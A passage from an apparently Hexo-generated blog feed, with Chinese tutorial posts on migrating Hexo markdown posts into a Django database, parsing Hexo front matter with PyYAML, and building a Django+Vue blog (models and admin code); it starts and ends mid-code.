inputfile.find(<span class="string">'.md'</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            self.transblogbyfile(inputfile)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.transblogbypath(inputfile)</span><br><span class="line">        <span class="keyword">if</span> options[<span class="string">'path'</span>]:</span><br><span class="line">            self.transblogbypath(options[<span class="string">'path'</span>])</span><br><span class="line">        <span class="keyword">if</span> options[<span class="string">'file'</span>]:</span><br><span class="line">            self.transblogbyfile(options[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="string">'''读取目录解析md文件并写入数据库'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">transblogbypath</span><span class="params">(self,filepath=<span class="string">''</span>,)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            files = os.listdir(filepath)</span><br><span class="line">            <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                <span class="keyword">if</span> file.find(<span class="string">'.md'</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                    blog_file = os.path.join(filepath, file)</span><br><span class="line">                    self.transblogbyfile(blog_file)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">'请确认输入是否正确。'</span>,e)</span><br><span class="line"></span><br><span class="line">    <span class="string">'''读取md文件入库'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">transblogbyfile</span><span class="params">(self,blogfile=<span class="string">''</span>)</span>:</span></span><br><span class="line">        blog_info = parseblog(blogfile)</span><br><span class="line">        filename=os.path.basename(blogfile)</span><br><span class="line">        <span class="comment">#判断是否存在相同的title</span></span><br><span class="line">        qs=BlogPost.objects.filter(title=blog_info[<span class="string">'title'</span>])</span><br><span class="line">        <span class="keyword">if</span> len(qs)==<span class="number">0</span>:</span><br><span class="line">            category = <span class="literal">None</span></span><br><span class="line">            tag_objs = []</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'categories'</span> <span class="keyword">in</span> blog_info:</span><br><span class="line">                categories=blog_info[<span class="string">'categories'</span>]</span><br><span class="line">                <span class="keyword">if</span> len(categories)&gt;<span class="number">0</span>:</span><br><span class="line">                    category_title = categories[<span class="number">0</span>]</span><br><span class="line">                    category_qs=BlogCategory.objects.filter(title=category_title)</span><br><span class="line">                    <span class="keyword">if</span> len(category_qs)&gt;<span class="number">0</span>:</span><br><span class="line">                        category=category_qs[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'tags'</span> <span class="keyword">in</span> blog_info:</span><br><span class="line">                tags=blog_info[<span class="string">'tags'</span>]</span><br><span class="line">                <span class="keyword">for</span> tag <span class="keyword">in</span> tags:</span><br><span class="line">                    tag_obj,b=Tag.objects.get_or_create(tag=tag)</span><br><span class="line">                    print(tag_obj.id)</span><br><span class="line">                    tag_objs.append(tag_obj)</span><br><span class="line">            blog = BlogPost()</span><br><span class="line">            blog.title = blog_info[<span class="string">'title'</span>]</span><br><span class="line">            blog.content = blog_info[<span class="string">'content'</span>]</span><br><span class="line">            blog.isShow = <span class="number">1</span> <span class="comment">#默认显示</span></span><br><span class="line">            blog.summary=blog.content[<span class="number">0</span>:<span class="number">200</span>] <span class="comment">#默认提取内容的前200个字作为摘要</span></span><br><span class="line">            blog.category=category</span><br><span class="line">            blog.blogSource = filename</span><br><span class="line">            blog.pubTime=blog_info[<span class="string">'date'</span>]</span><br><span class="line">            blog.save()</span><br><span class="line">            <span class="keyword">if</span> len(tag_objs)&gt;<span class="number">0</span>:</span><br><span class="line">                blog.tags.add(*tag_objs)</span><br><span class="line">            print(filename + <span class="string">'读取解析入库成功！'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(blog_info[<span class="string">'title'</span>]+<span class="string">'已经存在！'</span>)</span><br></pre></td></tr></table></figure><p>代码很简单，就是根据读取命令行的参数，这个参数就是需要迁移hexo的.md文件的目录或文件路径，读取目录或文件路径进行文件的解析，并写入到数据库。<br>.md文件的解析参考:<a href="https://blog.csdn.net/fullbug/article/details/126007706" target="_blank" rel="noopener">Python二十行代码实现hexo的md文件格式解析</a></p><h2 id="三、测试验证"><a href="#三、测试验证" class="headerlink" title="三、测试验证"></a>三、测试验证</h2><p>命令代码写完后就可以进行测试了。<br>在命令行输入<code>python manage.py</code> 可以看到自定义的transblog已经加入到管理命令了</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220727/Django%E8%87%AA%E5%AE%9A%E4%B9%89manage.py%E5%91%BD%E4%BB%A4%E5%AE%9E%E7%8E%B0hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4.png" alt="transblog已经加入到管理命令"></p><p>输入 <code>python manage.py transblog -h</code><br>会提示命令的参数和用法：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220727/Django%E8%87%AA%E5%AE%9A%E4%B9%89manage.py%E5%91%BD%E4%BB%A4%E5%AE%9E%E7%8E%B0hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4%E5%B8%AE%E5%8A%A9.png" alt="管理命令帮助"></p><p>如执行 <code>python manage.py transblog</code> 会提示”请输入指定的目录路径或.md文件路径:”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(venv) PS D:\Python\study\pythonproject\ishareblog\ishareblog&gt; python manage.py transblog</span><br><span class="line">请输入指定的目录路径或.md文件路径:</span><br></pre></td></tr></table></figure><p>我们输入需要迁移的.md文件或路径<br>如：E:\CloudStation\personal\xiejavablog\myhexo\myblog\source_posts\2022-07-27-Python二十行代码实现hexo的md文件格式解析.md<br>不出意外的情况下控制台会打印“XXXX.md读取解析入库成功！”的信息<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220727/Django%E8%87%AA%E5%AE%9A%E4%B9%89manage.py%E5%91%BD%E4%BB%A4%E5%AE%9E%E7%8E%B0hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C1.png" alt="执行效果"></p><p>访问博客，可以看到文章已经迁移过来了<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220727/Django%E8%87%AA%E5%AE%9A%E4%B9%89manage.py%E5%91%BD%E4%BB%A4%E5%AE%9E%E7%8E%B0hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB/%E6%89%A7%E8%A1%8C%E6%95%88%E6%9E%9C2.png" alt="执行效果"><br>全部代码仓库：<a href="https://gitee.com/ishareblog/ishareblog" target="_blank" rel="noopener">https://gitee.com/ishareblog/ishareblog</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python二十行代码实现hexo的md文件格式解析</title>
      <link href="/posts/f47f6214/"/>
      <url>/posts/f47f6214/</url>
      
        <content type="html"><![CDATA[<p>最近用django+Vue实现了一个博客应用，原来的hexo的博客用着也挺好，想继续留着用，于是就想将hexo生成的.md的博客内容文件解析后直接写到django的博客数据库里做同步显示。</p><p>hexo生成的.md文件内容主要分两部分，一部分是博客的信息、一部分是博客内容，博客信息包括标题、目录、标签、发布日期等，博客内容就是具体博客写的内容主体了。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220727/hexo%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%96%87%E4%BB%B6.png" alt="hexo生成的.md文件内容"></p><p>其中博客信息通过”—“来区分，夹在两个”—“块之间。博客的信息是yaml来描叙的需要解析并提取出相应的字段及内容，博客内容就更简单了直接是markdown描叙的不需要再解析了。<br>这里要做的事情就是提取两个”—“符号之间的内容，并解析相应的字段，提取两个”—“符号后面的内容作为博客的内容，形成字典，便于后面的入库。</p><p>代码示例如下：<br>yaml的解析可以直接用Python的PyYAML库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install PyYAML</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    :author: XieJava</span></span><br><span class="line"><span class="string">    :url: http://ishareread.com</span></span><br><span class="line"><span class="string">    :copyright: © 2021 XieJava &lt;xiejava@ishareread.com&gt;</span></span><br><span class="line"><span class="string">    :license: MIT, see LICENSE for more details.</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line"><span class="string">'''将md文件转成blog对象'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseblog</span><span class="params">(blog_md_file)</span>:</span></span><br><span class="line">    <span class="comment">#读md文件</span></span><br><span class="line">    md_f = open(blog_md_file, <span class="string">"r"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    md_f_str=md_f.read()</span><br><span class="line">    <span class="comment">#解析两个---之间的内容</span></span><br><span class="line">    pattern=<span class="string">'---'</span></span><br><span class="line">    blog_data=&#123;&#125;</span><br><span class="line">    pattern_list=list(pattern_search(md_f_str, pattern))</span><br><span class="line">    <span class="keyword">if</span> len(pattern_list)&gt;=<span class="number">2</span>:</span><br><span class="line">        blog_info_str=md_f_str[pattern_list[<span class="number">0</span>]+len(pattern):pattern_list[<span class="number">1</span>]]</span><br><span class="line">        blog_data=yaml.load(blog_info_str,Loader=yaml.SafeLoader)</span><br><span class="line">        blog_data[<span class="string">'content'</span>]=md_f_str[pattern_list[<span class="number">1</span>]+len(pattern):]</span><br><span class="line">    md_f.close()</span><br><span class="line">    <span class="keyword">return</span> blog_data</span><br><span class="line"></span><br><span class="line"><span class="string">'''分割符号匹配检索'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pattern_search</span><span class="params">(string,pattern)</span>:</span></span><br><span class="line">    index=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index&lt;len(string)-len(pattern):</span><br><span class="line">        index=string.find(pattern,index,len(string))</span><br><span class="line">        <span class="keyword">if</span> index==<span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">yield</span> index</span><br><span class="line">        index+=len(pattern)<span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    blog_data=parseblog(<span class="string">'E:\\CloudStation\\personal\\xiejavablog\\myhexo\\myblog\\source\\_posts\\2022-07-19-Vue3解析markdown解析并实现代码高亮显示.md'</span>)</span><br><span class="line">    print(blog_data)</span><br></pre></td></tr></table></figure><p>效果：<br>可以看到hexo的md文件正确解析出来，形成字典。后续可以直接进行入库操作了。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220727/%E8%A7%A3%E6%9E%90%E6%95%88%E6%9E%9C.png" alt="解析效果"></p><p>Python的库还是很丰富实用的，用Python二十行代码就实现hexo的md文件格式解析。</p><p>源代码仓库：<a href="https://gitee.com/ishareblog/ishareblog" target="_blank" rel="noopener">https://gitee.com/ishareblog/ishareblog</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django+Vue快速实现博客网站</title>
      <link href="/posts/15ee23ea/"/>
      <url>/posts/15ee23ea/</url>
      
        <content type="html"><![CDATA[<p>Django是一个开放源代码的Web应用框架，由Python写成。采用了MTV的框架模式，即模型M，视图V和模版T。它最初是被开发来用于管理劳伦斯出版集团旗下的一些以新闻内容为主的网站的，即是CMS（内容管理系统）软件。对于博客网站来说是典型的CMS应用。本文介绍通过Django+Vue的博客模版快速实现一个可用的博客网站。</p><p>这里用的博客模板是Gblog是一款nice的基于 vue 的博客模板。界面简洁轻快，非常适合用作个人博客。<a href="https://gitee.com/fengziy/Gblog" target="_blank" rel="noopener">https://gitee.com/fengziy/Gblog</a> 后台的接口和管理界面就通过Django框架来实现了。</p><p>这里数据库用mysql，接口框架主要用到的是Django的djangorestframework，内容编辑器用的是markdown通过django-mdedior库实现。</p><h2 id="一、依赖库"><a href="#一、依赖库" class="headerlink" title="一、依赖库"></a>一、依赖库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">asgiref==3.5.2</span><br><span class="line">Django==4.0.6</span><br><span class="line">django-cors-headers==3.13.0</span><br><span class="line">django-filter==22.1</span><br><span class="line">django-mdeditor==0.1.20</span><br><span class="line">djangorestframework==3.13.1</span><br><span class="line">mysqlclient==2.1.1</span><br><span class="line">Pillow==9.2.0</span><br><span class="line">pytz==2022.1</span><br><span class="line">sqlparse==0.4.2</span><br><span class="line">tzdata==2022.1</span><br></pre></td></tr></table></figure><h2 id="二、工程目录组织结构"><a href="#二、工程目录组织结构" class="headerlink" title="二、工程目录组织结构"></a>二、工程目录组织结构</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220726/%E5%B7%A5%E7%A8%8B%E7%9B%AE%E5%BD%95%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84.png" alt="工程目录组织结构"></p><h2 id="三、代码实现"><a href="#三、代码实现" class="headerlink" title="三、代码实现"></a>三、代码实现</h2><h3 id="1、模型"><a href="#1、模型" class="headerlink" title="1、模型"></a>1、模型</h3><p>模型很简单，根据Gblog前台要显示的内容包括有‘文章分类’、‘文章标签’、‘博客文章’、‘站点信息’、‘社交信息’、‘聚焦’，模型定义分别如下：<br>这里要说明的是因为博客文章内容准备用markdown编写，所以引入了mdeditor <code>from mdeditor.fields import MDTextField</code><br>内容字段<code>content=MDTextField(verbose_name=&#39;内容&#39;)</code><br>模型代码示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> common.basemodel <span class="keyword">import</span> BaseModel</span><br><span class="line"><span class="keyword">from</span> mdeditor.fields <span class="keyword">import</span> MDTextField</span><br><span class="line"><span class="comment"># Create your models here.</span></span><br><span class="line"><span class="string">'''文章分类'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogCategory</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    id = models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    title=models.CharField(max_length=<span class="number">50</span>,verbose_name=<span class="string">'分类名称'</span>,default=<span class="string">''</span>)</span><br><span class="line">    href=models.CharField(max_length=<span class="number">100</span>,verbose_name=<span class="string">'分类路径'</span>,default=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.title</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        verbose_name=<span class="string">'文章分类'</span></span><br><span class="line">        verbose_name_plural=<span class="string">'文章分类'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''文章标签'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tag</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    id=models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    tag=models.CharField(max_length=<span class="number">20</span>, verbose_name=<span class="string">'标签'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tag</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        verbose_name=<span class="string">'标签'</span></span><br><span class="line">        verbose_name_plural=<span class="string">'标签'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''博客文章'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogPost</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    id = models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    title = models.CharField(max_length=<span class="number">200</span>, verbose_name=<span class="string">'文章标题'</span>, unique = <span class="literal">True</span>)</span><br><span class="line">    category = models.ForeignKey(BlogCategory, blank=<span class="literal">True</span>, null=<span class="literal">True</span>, verbose_name=<span class="string">'文章分类'</span>, on_delete=models.DO_NOTHING)</span><br><span class="line">    isTop=models.BooleanField(default=<span class="literal">False</span>,verbose_name=<span class="string">'是否置顶'</span>)</span><br><span class="line">    isHot=models.BooleanField(default=<span class="literal">False</span>,verbose_name=<span class="string">'是否热门'</span>)</span><br><span class="line">    summary=models.CharField(max_length=<span class="number">500</span>,verbose_name=<span class="string">'内容摘要'</span>,default=<span class="string">''</span>)</span><br><span class="line">    content=MDTextField(verbose_name=<span class="string">'内容'</span>)</span><br><span class="line">    viewsCount= models.IntegerField(default=<span class="number">0</span>, verbose_name=<span class="string">"查看数"</span>)</span><br><span class="line">    commentsCount=models.IntegerField(default=<span class="number">0</span>, verbose_name=<span class="string">"评论数"</span>)</span><br><span class="line">    tags=models.ManyToManyField(to=Tag, related_name=<span class="string">"tag_post"</span>, blank=<span class="literal">True</span>, default=<span class="literal">None</span>,verbose_name=<span class="string">"标签"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tag_list</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">','</span>.join([i.tag <span class="keyword">for</span> i <span class="keyword">in</span> self.tags.all()])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">            <span class="keyword">return</span> self.title</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        verbose_name = <span class="string">'博客文章'</span></span><br><span class="line">        verbose_name_plural = <span class="string">'博客文章'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''站点信息'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    id = models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    name=models.CharField(max_length=<span class="number">50</span>, verbose_name=<span class="string">'站点名称'</span>, unique = <span class="literal">True</span>)</span><br><span class="line">    avatar=models.CharField(max_length=<span class="number">200</span>, verbose_name=<span class="string">'站点图标'</span>)</span><br><span class="line">    slogan=models.CharField(max_length=<span class="number">200</span>, verbose_name=<span class="string">'站点标语'</span>)</span><br><span class="line">    domain=models.CharField(max_length=<span class="number">200</span>, verbose_name=<span class="string">'站点域名'</span>)</span><br><span class="line">    notice=models.CharField(max_length=<span class="number">200</span>, verbose_name=<span class="string">'站点备注'</span>)</span><br><span class="line">    desc=models.CharField(max_length=<span class="number">200</span>, verbose_name=<span class="string">'站点描述'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">            <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        verbose_name = <span class="string">'站点信息'</span></span><br><span class="line">        verbose_name_plural = <span class="string">'站点信息'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''社交信息'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Social</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    id=models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    title=models.CharField(max_length=<span class="number">20</span>, verbose_name=<span class="string">'标题'</span>)</span><br><span class="line">    icon=models.CharField(max_length=<span class="number">200</span>, verbose_name=<span class="string">'图标'</span>)</span><br><span class="line">    color=models.CharField(max_length=<span class="number">20</span>, verbose_name=<span class="string">'颜色'</span>)</span><br><span class="line">    href=models.CharField(max_length=<span class="number">100</span>, verbose_name=<span class="string">'路径'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.title</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        verbose_name = <span class="string">'社交信息'</span></span><br><span class="line">        verbose_name_plural = <span class="string">'社交信息'</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''聚焦'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Focus</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    id=models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    title=models.CharField(max_length=<span class="number">20</span>, verbose_name=<span class="string">'标题'</span>)</span><br><span class="line">    img=models.CharField(max_length=<span class="number">100</span>, verbose_name=<span class="string">'路径'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.title</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        verbose_name=<span class="string">'聚焦'</span></span><br><span class="line">        verbose_name_plural=<span class="string">'聚焦'</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''友链'''</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Friend</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    id=models.AutoField(primary_key=<span class="literal">True</span>)</span><br><span class="line">    siteName=models.CharField(max_length=<span class="number">20</span>, verbose_name=<span class="string">'友链站点名称'</span>)</span><br><span class="line">    path=models.CharField(max_length=<span class="number">100</span>, verbose_name=<span class="string">'地址路径'</span>)</span><br><span class="line">    desc=models.CharField(max_length=<span class="number">200</span>, verbose_name=<span class="string">'描述'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.siteName</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        verbose_name=<span class="string">'友链'</span></span><br><span class="line">        verbose_name_plural=<span class="string">'友链'</span></span><br></pre></td></tr></table></figure><h3 id="2、admin管理"><a href="#2、admin管理" class="headerlink" title="2、admin管理"></a>2、admin管理</h3><p>实际上只要把模型注册到admin就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> blog.models <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># Register your models here.</span></span><br><span class="line"><span class="meta">@admin.register(BlogCategory)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogCategoryAdmin</span><span class="params">(admin.ModelAdmin)</span>:</span></span><br><span class="line">    admin.site.site_title=<span class="string">"ishareblog后台"</span></span><br><span class="line">    admin.site.site_header=<span class="string">"ishareblog后台"</span></span><br><span class="line">    admin.site.index_title=<span class="string">"ishareblog管理"</span></span><br><span class="line"></span><br><span class="line">    list_display = [<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'href'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.register(BlogPost)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BlogPostAdmin</span><span class="params">(admin.ModelAdmin)</span>:</span></span><br><span class="line">    list_display = [<span class="string">'title'</span>,<span class="string">'category'</span>,<span class="string">'isTop'</span>,<span class="string">'isHot'</span>]</span><br><span class="line">    search_fields = (<span class="string">'title'</span>,)</span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.register(Site)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SiteAdmin</span><span class="params">(admin.ModelAdmin)</span>:</span></span><br><span class="line">    list_display = [<span class="string">'name'</span>,<span class="string">'slogan'</span>,<span class="string">'domain'</span>,<span class="string">'desc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@admin.register(Social)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SocialAdmin</span><span 